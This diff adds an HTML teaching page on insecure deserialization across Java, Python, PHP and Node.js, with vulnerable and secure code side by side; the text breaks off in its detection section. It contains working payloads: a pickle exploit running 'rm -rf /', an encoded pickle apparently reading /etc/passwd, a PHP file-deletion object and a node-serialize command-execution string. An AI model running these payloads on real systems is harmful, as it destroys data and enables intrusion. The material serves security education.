@@ -1,0 +1,1291 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Deserialization Attack Demo - Educational</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #2c3e50 0%, #34495e 50%, #2c3e50 100%);
+            min-height: 100vh;
+            color: #e4e4e4;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        header {
+            text-align: center;
+            padding: 30px 0;
+            border-bottom: 2px solid #e67e22;
+            margin-bottom: 30px;
+        }
+
+        h1 {
+            color: #e67e22;
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+
+        .warning-banner {
+            background: linear-gradient(90deg, #c0392b, #e74c3c);
+            padding: 15px 25px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .warning-banner .icon {
+            font-size: 2rem;
+        }
+
+        .warning-banner p {
+            font-weight: 500;
+        }
+
+        .section {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 25px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        h2 {
+            color: #e67e22;
+            margin-bottom: 20px;
+            font-size: 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        h3 {
+            color: #f39c12;
+            margin: 20px 0 10px 0;
+        }
+
+        .demo-container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        @media (max-width: 768px) {
+            .demo-container {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .demo-box {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 20px;
+        }
+
+        .demo-box.vulnerable {
+            border: 2px solid #e74c3c;
+        }
+
+        .demo-box.secure {
+            border: 2px solid #27ae60;
+        }
+
+        .demo-box h4 {
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .vulnerable h4 {
+            color: #e74c3c;
+        }
+
+        .secure h4 {
+            color: #27ae60;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #aaa;
+        }
+
+        input[type="text"],
+        textarea,
+        select {
+            width: 100%;
+            padding: 12px 15px;
+            border: none;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            font-size: 0.9rem;
+            margin-bottom: 15px;
+        }
+
+        textarea {
+            font-family: 'Courier New', monospace;
+            min-height: 100px;
+            resize: vertical;
+        }
+
+        input::placeholder,
+        textarea::placeholder {
+            color: #666;
+        }
+
+        button {
+            background: linear-gradient(90deg, #e67e22, #d35400);
+            color: #fff;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 1rem;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(230, 126, 34, 0.3);
+        }
+
+        .code-display {
+            background: #1a1a1a;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 15px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            overflow-x: auto;
+        }
+
+        .code-display .label {
+            color: #888;
+            margin-bottom: 8px;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        .code-display code {
+            color: #a5d6ff;
+            word-break: break-all;
+        }
+
+        .exploit-highlight {
+            color: #e74c3c;
+            background: rgba(231, 76, 60, 0.2);
+            padding: 2px 5px;
+            border-radius: 3px;
+        }
+
+        .result-box {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 15px;
+            min-height: 100px;
+        }
+
+        .result-box.success {
+            border-left: 4px solid #27ae60;
+        }
+
+        .result-box.danger {
+            border-left: 4px solid #e74c3c;
+        }
+
+        .result-box.info {
+            border-left: 4px solid #3498db;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 15px;
+        }
+
+        th, td {
+            padding: 10px;
+            text-align: left;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        th {
+            background: rgba(230, 126, 34, 0.2);
+            color: #e67e22;
+        }
+
+        .code-block {
+            background: #0d1117;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 15px 0;
+            overflow-x: auto;
+        }
+
+        .code-block pre {
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            line-height: 1.5;
+        }
+
+        .comment {
+            color: #6a737d;
+        }
+
+        .keyword {
+            color: #ff7b72;
+        }
+
+        .string {
+            color: #a5d6ff;
+        }
+
+        .function {
+            color: #d2a8ff;
+        }
+
+        .variable {
+            color: #ffa657;
+        }
+
+        .attack-types {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        .attack-card {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: transform 0.3s;
+        }
+
+        .attack-card:hover {
+            transform: translateY(-5px);
+            border-color: #e74c3c;
+        }
+
+        .attack-card h4 {
+            color: #e74c3c;
+            margin-bottom: 10px;
+        }
+
+        .payload-list {
+            list-style: none;
+            margin-top: 15px;
+        }
+
+        .payload-list li {
+            background: rgba(231, 76, 60, 0.1);
+            padding: 10px 15px;
+            margin-bottom: 8px;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.8rem;
+            border-left: 3px solid #e74c3c;
+        }
+
+        .tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .tab-btn {
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            border: none;
+            transition: all 0.3s;
+        }
+
+        .tab-btn.active {
+            background: #e67e22;
+            color: #fff;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .prevention-list {
+            list-style: none;
+        }
+
+        .prevention-list li {
+            padding: 15px;
+            margin-bottom: 10px;
+            background: rgba(39, 174, 96, 0.1);
+            border-radius: 8px;
+            border-left: 4px solid #27ae60;
+        }
+
+        .prevention-list li strong {
+            color: #27ae60;
+        }
+
+        .flowchart {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .flow-step {
+            background: rgba(230, 126, 34, 0.2);
+            padding: 15px 30px;
+            border-radius: 10px;
+            text-align: center;
+            width: 80%;
+            max-width: 400px;
+        }
+
+        .flow-arrow {
+            font-size: 1.5rem;
+            color: #e67e22;
+        }
+
+        footer {
+            text-align: center;
+            padding: 30px;
+            color: #666;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            margin-top: 30px;
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+
+        .badge.critical {
+            background: #c0392b;
+            color: #fff;
+        }
+
+        .badge.high {
+            background: #e74c3c;
+            color: #fff;
+        }
+
+        .badge.medium {
+            background: #f39c12;
+            color: #000;
+        }
+
+        .explanation-box {
+            background: rgba(230, 126, 34, 0.1);
+            border-left: 4px solid #e67e22;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 8px;
+        }
+
+        .gadget-chain {
+            background: rgba(0, 0, 0, 0.4);
+            border: 2px solid #e74c3c;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 15px 0;
+        }
+
+        .gadget-chain h4 {
+            color: #e74c3c;
+            margin-bottom: 10px;
+        }
+
+        .chain-step {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px;
+            background: rgba(231, 76, 60, 0.1);
+            border-radius: 5px;
+            margin-bottom: 8px;
+        }
+
+        .chain-step .step-num {
+            background: #e74c3c;
+            color: #fff;
+            border-radius: 50%;
+            width: 25px;
+            height: 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.9rem;
+            font-weight: bold;
+            flex-shrink: 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🔓 Deserialization Attack Demo</h1>
+            <p>Understanding Insecure Deserialization for Security Education</p>
+        </header>
+
+        <div class="warning-banner">
+            <span class="icon">⚠️</span>
+            <div>
+                <p><strong>Educational Purpose Only!</strong></p>
+                <p>This demo is for learning about deserialization vulnerabilities. Never use these techniques on systems you don't own or have explicit permission to test.</p>
+            </div>
+        </div>
+
+        <!-- What is Deserialization -->
+        <div class="section">
+            <h2>📚 What is Insecure Deserialization?</h2>
+            <p>Deserialization is the process of converting serialized data (bytes/strings) back into objects. When an application deserializes untrusted data without proper validation, attackers can manipulate the serialized objects to execute arbitrary code, bypass authentication, or perform other malicious actions.</p>
+            
+            <div class="explanation-box">
+                <strong>Key Concept:</strong> Serialization converts objects to a format that can be stored or transmitted. Deserialization reverses this process. If an attacker controls the serialized data, they can inject malicious objects that execute code when deserialized.
+            </div>
+
+            <div class="flowchart">
+                <div class="flow-step">🎯 Attacker crafts malicious serialized object</div>
+                <div class="flow-arrow">↓</div>
+                <div class="flow-step">📤 Payload sent to application (cookie, API, file upload)</div>
+                <div class="flow-arrow">↓</div>
+                <div class="flow-step">🔧 Application deserializes untrusted data</div>
+                <div class="flow-arrow">↓</div>
+                <div class="flow-step">💣 Malicious code executes during deserialization</div>
+                <div class="flow-arrow">↓</div>
+                <div class="flow-step">💥 Remote Code Execution (RCE), system compromise</div>
+            </div>
+        </div>
+
+        <!-- Interactive Demo 1: Basic Deserialization -->
+        <div class="section">
+            <h2>🔐 Demo 1: Session Token Manipulation</h2>
+            <p>This demo shows how attackers can manipulate serialized session objects.</p>
+
+            <div class="demo-container">
+                <!-- Vulnerable Deserialization -->
+                <div class="demo-box vulnerable">
+                    <h4>❌ Vulnerable Deserialization</h4>
+                    <label>Session Token (Base64 encoded serialized object):</label>
+                    <textarea id="vuln-token" placeholder='{"username":"user","role":"guest","isAdmin":false}'></textarea>
+                    <button onclick="deserializeVulnerable()">Deserialize & Restore Session</button>
+                    
+                    <div class="code-display">
+                        <div class="label">Decoded Object:</div>
+                        <code id="vuln-decoded">Enter a token to see decoded object...</code>
+                    </div>
+                    
+                    <div id="vuln-result" class="result-box info">
+                        <p>The application will trust whatever is in the serialized object...</p>
+                    </div>
+                </div>
+
+                <!-- Secure Deserialization -->
+                <div class="demo-box secure">
+                    <h4>✅ Secure Session Management</h4>
+                    <label>Session Token (Signed & Validated):</label>
+                    <textarea id="secure-token" placeholder='Try modifying the session - it will be rejected'></textarea>
+                    <button onclick="deserializeSecure()">Deserialize & Validate</button>
+                    
+                    <div class="code-display">
+                        <div class="label">Validation Result:</div>
+                        <code id="secure-decoded">Signature validation required...</code>
+                    </div>
+                    
+                    <div id="secure-result" class="result-box success">
+                        <p>Sessions are signed with HMAC - tampering is detected...</p>
+                    </div>
+                </div>
+            </div>
+
+            <h3>Quick Test Payloads:</h3>
+            <div style="display: flex; flex-wrap: wrap; gap: 10px; margin-top: 15px;">
+                <button onclick="loadPayload('normal')">Normal User</button>
+                <button onclick="loadPayload('admin')">Admin Privilege Escalation</button>
+                <button onclick="loadPayload('rce')">RCE Payload</button>
+            </div>
+        </div>
+
+        <!-- Language-Specific Demos -->
+        <div class="section">
+            <h2>🎯 Demo 2: Language-Specific Attacks</h2>
+            
+            <div class="tabs">
+                <button class="tab-btn active" onclick="showDemo('java')">Java</button>
+                <button class="tab-btn" onclick="showDemo('python')">Python</button>
+                <button class="tab-btn" onclick="showDemo('php')">PHP</button>
+                <button class="tab-btn" onclick="showDemo('nodejs')">Node.js</button>
+            </div>
+
+            <!-- Java Demo -->
+            <div id="java-demo" class="tab-content active">
+                <div class="demo-box vulnerable">
+                    <h4>Java Deserialization Attack</h4>
+                    <label>Serialized Object (Base64):</label>
+                    <textarea id="java-payload" placeholder="rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwAC..."></textarea>
+                    <button onclick="simulateJavaDeserialize()">Deserialize (Java ObjectInputStream)</button>
+                    
+                    <div id="java-result" class="result-box info">
+                        <p>Java deserialization using gadget chains like Apache Commons Collections...</p>
+                    </div>
+                </div>
+
+                <div class="gadget-chain">
+                    <h4>Popular Java Gadget Chain: Apache Commons Collections</h4>
+                    <div class="chain-step">
+                        <div class="step-num">1</div>
+                        <div>PriorityQueue.readObject() is called during deserialization</div>
+                    </div>
+                    <div class="chain-step">
+                        <div class="step-num">2</div>
+                        <div>Comparator.compare() is invoked automatically</div>
+                    </div>
+                    <div class="chain-step">
+                        <div class="step-num">3</div>
+                        <div>ChainedTransformer chains multiple Transformers</div>
+                    </div>
+                    <div class="chain-step">
+                        <div class="step-num">4</div>
+                        <div>InvokerTransformer calls Runtime.exec()</div>
+                    </div>
+                    <div class="chain-step">
+                        <div class="step-num">5</div>
+                        <div>💥 Arbitrary command execution achieved!</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Python Demo -->
+            <div id="python-demo" class="tab-content">
+                <div class="demo-box vulnerable">
+                    <h4>Python Pickle Attack</h4>
+                    <label>Pickled Object (Base64):</label>
+                    <textarea id="python-payload" placeholder="gASVPgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAhjYXQgL2V0Yy9wYXNzd2SUhZRSlC4="></textarea>
+                    <button onclick="simulatePythonDeserialize()">Unpickle (Python pickle)</button>
+                    
+                    <div id="python-result" class="result-box info">
+                        <p>Python's pickle module can execute arbitrary code during deserialization...</p>
+                    </div>
+                </div>
+
+                <h3>Malicious Pickle Creation:</h3>
+                <div class="code-block">
+<pre><span class="keyword">import</span> pickle
+<span class="keyword">import</span> os
+
+<span class="keyword">class</span> <span class="function">Exploit</span>:
+    <span class="keyword">def</span> <span class="function">__reduce__</span>(self):
+        <span class="comment"># __reduce__ is called during pickling</span>
+        <span class="comment"># Returns (callable, args) to execute during unpickling</span>
+        <span class="keyword">return</span> (os.system, (<span class="string">'rm -rf /'</span>,))
+
+payload = pickle.dumps(Exploit())
+<span class="comment"># When unpickled, os.system('rm -rf /') executes!</span></pre>
+                </div>
+            </div>
+
+            <!-- PHP Demo -->
+            <div id="php-demo" class="tab-content">
+                <div class="demo-box vulnerable">
+                    <h4>PHP Unserialize Attack</h4>
+                    <label>Serialized Object:</label>
+                    <textarea id="php-payload" placeholder='O:4:"User":2:{s:8:"username";s:5:"admin";s:7:"isAdmin";b:1;}'></textarea>
+                    <button onclick="simulatePhpDeserialize()">Unserialize (PHP)</button>
+                    
+                    <div id="php-result" class="result-box info">
+                        <p>PHP object injection can trigger magic methods like __wakeup(), __destruct()...</p>
+                    </div>
+                </div>
+
+                <h3>PHP Object Injection Example:</h3>
+                <div class="code-block">
+<pre><span class="keyword">class</span> <span class="function">FileDeleter</span> {
+    <span class="keyword">private</span> <span class="variable">$filename</span>;
+    
+    <span class="keyword">function</span> <span class="function">__destruct</span>() {
+        <span class="comment">// Called automatically when object is destroyed</span>
+        unlink(<span class="variable">$this</span>-&gt;<span class="variable">filename</span>);
+    }
+}
+
+<span class="comment">// Attacker crafts:</span>
+<span class="comment">// O:11:"FileDeleter":1:{s:8:"filename";s:17:"/var/www/index.php";}</span>
+<span class="variable">$obj</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">'data'</span>]);
+<span class="comment">// When script ends, __destruct() deletes /var/www/index.php!</span></pre>
+                </div>
+            </div>
+
+            <!-- Node.js Demo -->
+            <div id="nodejs-demo" class="tab-content">
+                <div class="demo-box vulnerable">
+                    <h4>Node.js Deserialization Attack</h4>
+                    <label>Serialized Object (JSON):</label>
+                    <textarea id="nodejs-payload" placeholder='{"username":"user","__proto__":{"isAdmin":true}}'></textarea>
+                    <button onclick="simulateNodeDeserialize()">Deserialize (node-serialize)</button>
+                    
+                    <div id="nodejs-result" class="result-box info">
+                        <p>Prototype pollution and unsafe deserialization in Node.js...</p>
+                    </div>
+                </div>
+
+                <h3>Node.js Prototype Pollution:</h3>
+                <div class="code-block">
+<pre><span class="keyword">const</span> serialize = <span class="keyword">require</span>(<span class="string">'node-serialize'</span>);
+
+<span class="comment">// Attacker payload with IIFE (Immediately Invoked Function Expression)</span>
+<span class="keyword">const</span> payload = <span class="string">'{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'calc\', function(){});}()"}'</span>;
+
+<span class="comment">// When deserialized, the function executes immediately!</span>
+<span class="keyword">const</span> obj = serialize.unserialize(payload);
+<span class="comment">// Calculator launches (or any command in exec)</span></pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- Common Attack Vectors -->
+        <div class="section">
+            <h2>⚔️ Common Deserialization Attack Vectors</h2>
+            
+            <div class="attack-types">
+                <div class="attack-card">
+                    <h4>1. Remote Code Execution <span class="badge critical">CRITICAL</span></h4>
+                    <p>Execute arbitrary commands on the server through gadget chains.</p>
+                    <ul class="payload-list">
+                        <li>Java: Commons Collections, Spring, etc.</li>
+                        <li>Python: pickle.__reduce__() abuse</li>
+                        <li>PHP: Magic method exploitation</li>
+                    </ul>
+                </div>
+
+                <div class="attack-card">
+                    <h4>2. Privilege Escalation <span class="badge critical">CRITICAL</span></h4>
+                    <p>Modify user roles and permissions in serialized objects.</p>
+                    <ul class="payload-list">
+                        <li>isAdmin: false → true</li>
+                        <li>role: "user" → "admin"</li>
+                        <li>permissions: ["read"] → ["read","write","delete"]</li>
+                    </ul>
+                </div>
+
+                <div class="attack-card">
+                    <h4>3. Authentication Bypass <span class="badge critical">CRITICAL</span></h4>
+                    <p>Forge session tokens to impersonate other users.</p>
+                    <ul class="payload-list">
+                        <li>Modify username in cookie</li>
+                        <li>Set authenticated: true</li>
+                        <li>Change user_id to admin ID</li>
+                    </ul>
+                </div>
+
+                <div class="attack-card">
+                    <h4>4. SQL Injection via Deserialization <span class="badge high">HIGH</span></h4>
+                    <p>Inject SQL through object properties.</p>
+                    <ul class="payload-list">
+                        <li>username: "admin' OR '1'='1"</li>
+                        <li>Query built from deserialized data</li>
+                    </ul>
+                </div>
+
+                <div class="attack-card">
+                    <h4>5. Denial of Service <span class="badge high">HIGH</span></h4>
+                    <p>Cause crashes through deeply nested objects.</p>
+                    <ul class="payload-list">
+                        <li>Recursive object references</li>
+                        <li>Memory exhaustion</li>
+                        <li>Billion laughs-style expansion</li>
+                    </ul>
+                </div>
+
+                <div class="attack-card">
+                    <h4>6. File System Access <span class="badge high">HIGH</span></h4>
+                    <p>Read/write files through deserialization.</p>
+                    <ul class="payload-list">
+                        <li>File upload gadgets</li>
+                        <li>Path traversal in objects</li>
+                        <li>Arbitrary file deletion</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Vulnerable Code Examples -->
+        <div class="section">
+            <h2>💻 Vulnerable vs Secure Code</h2>
+            
+            <div class="tabs">
+                <button class="tab-btn active" onclick="showTab('java-code')">Java</button>
+                <button class="tab-btn" onclick="showTab('python-code')">Python</button>
+                <button class="tab-btn" onclick="showTab('php-code')">PHP</button>
+                <button class="tab-btn" onclick="showTab('nodejs-code')">Node.js</button>
+            </div>
+
+            <div id="java-code" class="tab-content active">
+                <h3 style="color: #e74c3c;">❌ Vulnerable Java Code</h3>
+                <div class="code-block">
+<pre><span class="keyword">import</span> java.io.*;
+
+<span class="comment">// VULNERABLE - Deserializes untrusted data!</span>
+<span class="keyword">public class</span> VulnerableApp {
+    <span class="keyword">public</span> Object readObject(byte[] data) {
+        <span class="keyword">try</span> {
+            ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(
+                <span class="keyword">new</span> ByteArrayInputStream(data)
+            );
+            <span class="keyword">return</span> ois.readObject();  <span class="comment">// Dangerous!</span>
+        } <span class="keyword">catch</span> (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}</pre>
+                </div>
+
+                <h3 style="color: #27ae60;">✅ Secure Java Code</h3>
+                <div class="code-block">
+<pre><span class="keyword">import</span> java.io.*;
+
+<span class="comment">// SECURE - Use look-ahead deserialization</span>
+<span class="keyword">public class</span> SecureApp {
+    <span class="keyword">public</span> Object readObject(byte[] data) {
+        <span class="keyword">try</span> {
+            ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(
+                <span class="keyword">new</span> ByteArrayInputStream(data)
+            ) {
+                @Override
+                <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)
+                        <span class="keyword">throws</span> IOException, ClassNotFoundException {
+                    <span class="comment">// Whitelist allowed classes</span>
+                    String className = desc.getName();
+                    <span class="keyword">if</span> (!isWhitelisted(className)) {
+                        <span class="keyword">throw new</span> InvalidClassException(
+                            <span class="string">"Unauthorized deserialization"</span>,
+                            className
+                        );
+                    }
+                    <span class="keyword">return super</span>.resolveClass(desc);
+                }
+            };
+            <span class="keyword">return</span> ois.readObject();
+        } <span class="keyword">catch</span> (Exception e) {
+            <span class="comment">// Handle safely</span>
+        }
+    }
+    
+    <span class="comment">// Better: Avoid deserialization entirely, use JSON</span>
+}</pre>
+                </div>
+            </div>
+
+            <div id="python-code" class="tab-content">
+                <h3 style="color: #e74c3c;">❌ Vulnerable Python Code</h3>
+                <div class="code-block">
+<pre><span class="keyword">import</span> pickle
+
+<span class="comment"># VULNERABLE - Never unpickle untrusted data!</span>
+<span class="keyword">def</span> <span class="function">load_session</span>(cookie_data):
+    <span class="keyword">return</span> pickle.loads(cookie_data)  <span class="comment"># RCE vulnerability!</span>
+
+<span class="comment"># Also vulnerable:</span>
+<span class="keyword">with</span> open(<span class="string">'user_upload.pkl'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:
+    data = pickle.load(f)  <span class="comment"># Executes code in file!</span></pre>
+                </div>
+
+                <h3 style="color: #27ae60;">✅ Secure Python Code</h3>
+                <div class="code-block">
+<pre><span class="keyword">import</span> json
+<span class="keyword">import</span> hmac
+<span class="keyword">import</span> hashlib
+
+<span class="comment"># SECURE - Use JSON and sign the data</span>
+<span class="keyword">def</span> <span class="function">create_session</span>(data, secret_key):
+    json_data = json.dumps(data)
+    signature = hmac.new(
+        secret_key.encode(),
+        json_data.encode(),
+        hashlib.sha256
+    ).hexdigest()
+    <span class="keyword">return</span> json_data + <span class="string">'.'</span> + signature
+
+<span class="keyword">def</span> <span class="function">load_session</span>(token, secret_key):
+    <span class="keyword">try</span>:
+        json_data, signature = token.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)
+        expected_sig = hmac.new(
+            secret_key.encode(),
+            json_data.encode(),
+            hashlib.sha256
+        ).hexdigest()
+        
+        <span class="keyword">if</span> not hmac.compare_digest(signature, expected_sig):
+            <span class="keyword">raise</span> ValueError(<span class="string">"Invalid signature"</span>)
+        
+        <span class="keyword">return</span> json.loads(json_data)
+    <span class="keyword">except</span>:
+        <span class="keyword">return</span> <span class="keyword">None</span>
+
+<span class="comment"># Never use pickle for untrusted data!</span></pre>
+                </div>
+            </div>
+
+            <div id="php-code" class="tab-content">
+                <h3 style="color: #e74c3c;">❌ Vulnerable PHP Code</h3>
+                <div class="code-block">
+<pre><span class="comment">// VULNERABLE - unserialize on user input!</span>
+<span class="keyword">$user_data</span> = unserialize(<span class="keyword">$_COOKIE</span>[<span class="string">'session'</span>]);
+
+<span class="comment">// Also vulnerable:</span>
+<span class="keyword">$data</span> = unserialize(file_get_contents(<span class="string">'php://input'</span>));
+
+<span class="comment">// Magic methods are called automatically:</span>
+<span class="keyword">class</span> <span class="function">User</span> {
+    <span class="keyword">public</span> <span class="keyword">function</span> <span class="function">__wakeup</span>() {
+        <span class="comment">// Called during unserialize</span>
+        eval(<span class="keyword">$this</span>-&gt;code);  <span class="comment">// Attacker controls $code!</span>
+    }
+}</pre>
+                </div>
+
+                <h3 style="color: #27ae60;">✅ Secure PHP Code</h3>
+                <div class="code-block">
+<pre><span class="comment">// SECURE - Use JSON and validate</span>
+<span class="keyword">$user_data</span> = json_decode(<span class="keyword">$_COOKIE</span>[<span class="string">'session'</span>], <span class="keyword">true</span>);
+
+<span class="comment">// Better: Use proper session management</span>
+session_start();
+<span class="keyword">$_SESSION</span>[<span class="string">'user_id'</span>] = <span class="keyword">$user_id</span>;
+
+<span class="comment">// If you must use serialize, validate strictly:</span>
+<span class="keyword">$allowed_classes</span> = [<span class="string">'User'</span>, <span class="string">'Session'</span>];
+<span class="keyword">$data</span> = unserialize(
+    <span class="keyword">$input</span>,
+    [<span class="string">'allowed_classes'</span> =&gt; <span class="keyword">$allowed_classes</span>]
+);
+
+<span class="comment">// Avoid magic methods that execute code</span>
+<span class="comment">// Never eval() or include() in __wakeup/__destruct</span></pre>
+                </div>
+            </div>
+
+            <div id="nodejs-code" class="tab-content">
+                <h3 style="color: #e74c3c;">❌ Vulnerable Node.js Code</h3>
+                <div class="code-block">
+<pre><span class="keyword">const</span> serialize = <span class="keyword">require</span>(<span class="string">'node-serialize'</span>);
+
+<span class="comment">// VULNERABLE - node-serialize RCE</span>
+app.get(<span class="string">'/api'</span>, (req, res) => {
+    <span class="keyword">const</span> obj = serialize.unserialize(req.cookies.session);
+    res.json(obj);
+});
+
+<span class="comment">// Also vulnerable - prototype pollution:</span>
+<span class="keyword">const</span> user = JSON.parse(req.body);
+Object.assign(target, user);  <span class="comment">// Can pollute Object.prototype!</span></pre>
+                </div>
+
+                <h3 style="color: #27ae60;">✅ Secure Node.js Code</h3>
+                <div class="code-block">
+<pre><span class="keyword">const</span> jwt = <span class="keyword">require</span>(<span class="string">'jsonwebtoken'</span>);
+
+<span class="comment">// SECURE - Use JWT with signature</span>
+app.post(<span class="string">'/login'</span>, (req, res) => {
+    <span class="keyword">const</span> token = jwt.sign(
+        { userId: user.id, role: user.role },
+        process.env.JWT_SECRET,
+        { expiresIn: <span class="string">'1h'</span> }
+    );
+    res.cookie(<span class="string">'session'</span>, token, { httpOnly: <span class="keyword">true</span> });
+});
+
+app.get(<span class="string">'/api'</span>, (req, res) => {
+    <span class="keyword">try</span> {
+        <span class="keyword">const</span> decoded = jwt.verify(
+            req.cookies.session,
+            process.env.JWT_SECRET
+        );
+        <span class="comment">// Use decoded data safely</span>
+    } <span class="keyword">catch</span> (err) {
+        res.status(<span class="number">401</span>).send(<span class="string">'Invalid token'</span>);
+    }
+});
+
+<span class="comment">// Prevent prototype pollution:</span>
+<span class="keyword">const</span> safeAssign = (target, source) => {
+    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) {
+        <span class="keyword">if</span> (key === <span class="string">'__proto__'</span> || key === <span class="string">'constructor'</span>) <span class="keyword">continue</span>;
+        target[key] = source[key];
+    }
+};</pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- Prevention Methods -->
+        <div class="section">
+            <h2>🛡️ Prevention & Mitigation</h2>
+            
+            <ul class="prevention-list">
+                <li>
+                    <strong>1. Never Deserialize Untrusted Data</strong>
+                    <p>The best defense is to avoid deserializing user-controlled data entirely. Use safer formats like JSON with validation.</p>
+                </li>
+                <li>
+                    <strong>2. Use Digital Signatures (HMAC, JWT)</strong>
+                    <p>Sign serialized data with a secret key. Verify signatures before deserializing to ensure data hasn't been tampered with.</p>
+                </li>
+                <li>
+                    <strong>3. Implement Type Whitelisting</strong>
+                    <p>Only allow specific, safe classes to be deserialized. Reject any other types.</p>
+                </li>
+                <li>
+                    <strong>4. Disable Dangerous Features</strong>
+                    <p>Remove gadget chain classes from classpath. Use --add-opens cautiously in Java. Avoid pickle in Python for untrusted data.</p>
+                </li>
+                <li>
+                    <strong>5. Use Secure Serialization Libraries</strong>
+                    <p>Prefer JSON over binary serialization. Use libraries designed with security in mind (JWT, Protocol Buffers with validation).</p>
+                </li>
+                <li>
+                    <strong>6. Implement Integrity Checks</strong>
+                    <p>Use cryptographic hashes or MACs to detect tampering. Validate data structure and types after deserialization.</p>
+                </li>
+                <li>
+                    <strong>7. Isolate Deserialization</strong>
+                    <p>Run deserialization in sandboxed environments with minimal privileges. Use separate processes or containers.</p>
+                </li>
+                <li>
+                    <strong>8. Monitor and Log</strong>
+                    <p>Log all deserialization attempts. Monitor for suspicious patterns. Set up alerts for deserialization of unexpected classes.</p>
+                </li>
+            </ul>
+        </div>
+
+        <!-- Detection Methods -->
+        <div class="section">
+            <h2>🔍 Detection & Testing</h2>
+
+            <h3>How to Identify Deserialization Vulnerabilities:</h3>
+            <div class="attack-types">
+                <div class="attack-card" style="border-color: #3498db;">
+                    <h4 style="color: #3498db;">1. Look for Serialized Data</h4>
+                    <p>Identify where applications use serialization:</p>
+                    <ul class="payload-list" style="background: rgba(52, 152, 219, 0.1); border-left-color: #3498db;">
+                        <li>Cookies containing base64 or hex data</li>
+                        <li>API parameters with encoded objects</li>
+                        <li>Session tokens that aren't JWT</li>
+                        <li>File uploads accepting serialized formats</li>
+                    </ul>
+                </div>
+
+                <div class="attack-card" style="border-color: #3498db;">
+                    <h4 style="color: #3498db;">2. Recognize Serialization Formats</h4>
+                    <p>Common patterns to identify:</p>
+                    <ul class="payload-list" style="background: rgba(52, 152, 219, 0.1); border-left-color: #3498db;">
+                        <li>Java: rO0AB (hex: AC ED 00 05)</li>
+                        <li>Python: gASV or starts with pickle protocol</li>
+                        <li>PHP: O:4:"User" or a:2:{...}</li>
+                        <li>Node: _$$ND_FUNC$$_ for node-serialize</li>
+                    </ul>
+                </div>
+
